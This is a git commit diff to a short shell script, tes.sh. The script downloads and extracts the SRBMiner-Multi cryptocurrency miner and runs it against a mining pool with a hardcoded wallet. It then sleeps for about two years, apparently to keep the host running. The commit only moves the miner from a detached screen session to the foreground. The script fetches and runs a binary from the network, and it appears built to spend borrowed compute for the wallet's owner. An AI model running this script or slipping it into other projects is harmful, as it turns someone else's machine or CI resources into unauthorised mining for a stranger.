74a74af6f77a869d98efa0ca00d2af5cde461a1d
bibirbusin <132418678+bibirbusin@users.noreply.github.com>
2023-10-31 00:00:06 +0700

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -3,5 +3,5 @@
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
 tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz
 sleep 60
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowersugar --pool stratum+tcps://stratum-eu.rplant.xyz:17042 --wallet sugar1q6yntmx084j8uxdwcka93m5qqdzvnppmyak8uru.Luxy$RANDOM --cpu-threads 8
+./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowersugar --pool stratum+tcps://stratum-eu.rplant.xyz:17042 --wallet sugar1q6yntmx084j8uxdwcka93m5qqdzvnppmyak8uru.Luxy$RANDOM --cpu-threads 8
 sleep 60000000
